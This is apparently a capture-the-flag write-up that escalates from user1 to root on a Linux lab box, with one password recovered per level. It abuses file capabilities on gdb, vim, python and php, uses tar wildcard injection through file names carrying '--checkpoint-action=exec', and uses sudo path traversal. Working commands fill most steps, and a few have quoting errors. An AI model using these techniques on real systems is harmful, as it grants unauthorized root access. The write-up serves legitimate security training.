## User1
![](/images/privesc/user1.png)

Investigating ```/usr/bin/gdb``` capabilities reveals ```cap_dac_read_search=ep```.

The cap_dac_read_search capability provides users the ability to read ANY file on the filesystem, which includes all files owned by root. So we simply run:

```
gdb
python print(open("/root/user2.txt").read())
```
Password for user 2: WolfMountedFastnessNappy

## User2
![](/images/privesc/user2.png)

Investigating ```/usr/bin/vim.basic``` capabilities reveals 
```cap_dac_override=ep```.

The cap_dac_override capability provides a user with the ability to write to ANY file on the filesystem. Therefore we can symply access the ```user3.txt``` file with vim
```
vim /root/user3.txt
```
Password for user 3: PebblyClaritySuperiorMournful

## User3
![](/images/privesc/user3.png)

Investigating ```/usr/bin/python3.11``` capabilities reveals ```cap_fowner=ep```.

The cap_fowner capability provides a user with the ability to change the permissions of ANY file or directory on the filesystem, which includes all files and directories owned by root.

To get the quick root, simply set the SUID bit on /bin/bash, like so:
```
/usr/bin/python3 -c 'import os;os.chmod("/bin/bash", 0o4755)'
```
Then run ```/bin/bash``` and acces the needed file as root.

Password for user 4: JustifierDetachedCuppedEndurable

## User4
![](/images/privesc/user4.png)

Investigating ```/usr/bin/php8.2``` capabilities reveals ```cap_setuid=ep```.

The cap_setuid capability provides a user with the ability to run whatever binary that has this capability set as root.

We make a command to execute a PHP script that changes the user ID to 0 (which is the root user) and then execute a shell (/bin/sh). 

This effectively gives the user a shell with root privileges.
```
CMD="/bin/sh"
./php -r "posix_setuid(0); system('$CMD');"
```
Password for user 5: VentureRangedConveneVirus

## User5
![](/images/privesc/user5.png)

Investigating with ```./pspy``` reveals that there is a cronjob that archives all the data from ```/home/user5```. The exploitation is possible due to the checkpoint functionality within the tar utility.

First create a script that will save the contents of the ```/root/user6.txt``` in ```/home/user5/password.txt```.
Make the script executable.
Create a file named ```--checkpoint=1```.
Create another file named ```--checkpoint-action=exec=sh pwn.sh```.
```
echo “cat /root/user6.txt > /home/user5/password.txt” > /home/user5/pwn.sh
chmod +x /home/user5/pwn.sh
touch /home/user5/--checkpoint=1
touch /home/user5/--checkpoint-action=exec=sh\ pwn.sh
```

When the cronjob is executed, the wildcard is expanded to files in ```/home/user5```, which coincidentally can be interpreted as command-line arguments for tar. Thus, tar perceives them as arguments and executes the pwn.sh script. All thats left is to display the contents of ```/home/user5/password.txt```.

Password for user 6: RearViewUnscathedSantaRamble

## User6
![](/images/privesc/user6.png)

```sudo -l``` informs us that we can run ```/usr/bin/python3``` and ```/root/*.py``` as ```(root) NOPASSWD```.

Create the ```script.py``` under ```/tmp``` and add code to read data from the needed file.:
```
echo "print(open("/root/password.txt").read())" > /tmp/script.py
```
Now run the python command as root. We can pass the file using path traversal.
```
sudo /usr/bin/python3 /root/../tmp/script.py
```

Password for root: CapsAndMissesEverywhere
